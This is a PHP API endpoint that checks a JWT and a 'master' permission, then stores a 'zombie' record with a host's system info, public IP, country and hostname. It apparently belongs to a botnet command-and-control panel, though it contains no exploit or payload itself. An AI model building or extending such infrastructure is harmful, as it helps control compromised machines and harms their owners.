<?php
// required headers
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json; charset=UTF-8");
header("Access-Control-Allow-Methods: POST");
header("Access-Control-Max-Age: 3600");
header("Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, X-Requested-With");
  
// required to encode json web token
include_once 'config/core.php';
include_once 'libs/php-jwt/src/BeforeValidException.php';
include_once 'libs/php-jwt/src/ExpiredException.php';
include_once 'libs/php-jwt/src/SignatureInvalidException.php';
include_once 'libs/php-jwt/src/JWT.php';
use \Firebase\JWT\JWT;

// files needed to connect to database
include_once 'config/database.php';
include_once 'objects/zombie.php';

// auxilar functions
include_once 'util/check_permission.php';
 
// get posted data
$data = json_decode(file_get_contents("php://input"));

// get jwt
$jwt=isset($data->jwt) ? $data->jwt : "";
 
// if jwt is not empty
if($jwt){
 
    // if decode succeed, show user details
    try {

        // decode jwt
        $decoded = JWT::decode($jwt, $key, array('HS256'));
        // Check who request and permission
        $requested_by = $decoded->data->username;
        $to_create = $data->username;
        // this function raise exceptions in case of error (not requested by a master, or requesting changes on another master)
        check_master_permissions($requested_by, $to_create);

        // get database connection
        $database = new Database();
        $db = $database->getConnection();
        
        // instantiate user object
        $zombie = new Zombie($db);
        // set zombie property values
        $zombie->username = $data->username;
        $zombie->sysinfo = $data->sysinfo;
        $zombie->current_public_ip = $data->current_public_ip;
        $zombie->current_country = $data->current_country;
        $zombie->current_hostname = $data->current_hostname;

        // create the user
        if(
            !empty($zombie->username) &&
            //!empty($zombie->sysinfo) &&
            !empty($zombie->current_public_ip) &&
            !empty($zombie->current_country) &&
            //!empty($zombie->current_hostname) &&
            $zombie->create()
        ){
        
            // set response code
            http_response_code(200);
        
            // display message: user was created
            echo json_encode(array("message" => "Zombie was created."));
        }
        
        // message if unable to create zombie
        else{

            // set response code
            http_response_code(400);
        
            // display message: unable to create zombie
            echo json_encode(array("message" => "Unable to create zombie."));
        }
    }

        // if decode fails, it means jwt is invalid or check_permission fails
        catch (Exception $e){
    
            // set response code
            http_response_code(401);
        
            // show error message
            echo json_encode(array(
                "message" => "Access denied.",
                "error" => $e->getMessage()
            ));
        }
    }
     
    
    // show error message if jwt is empty
    else{
     
        // set response code
        http_response_code(401);
     
        // tell the user access denied
        echo json_encode(array("message" => "Access denied."));
    }

?>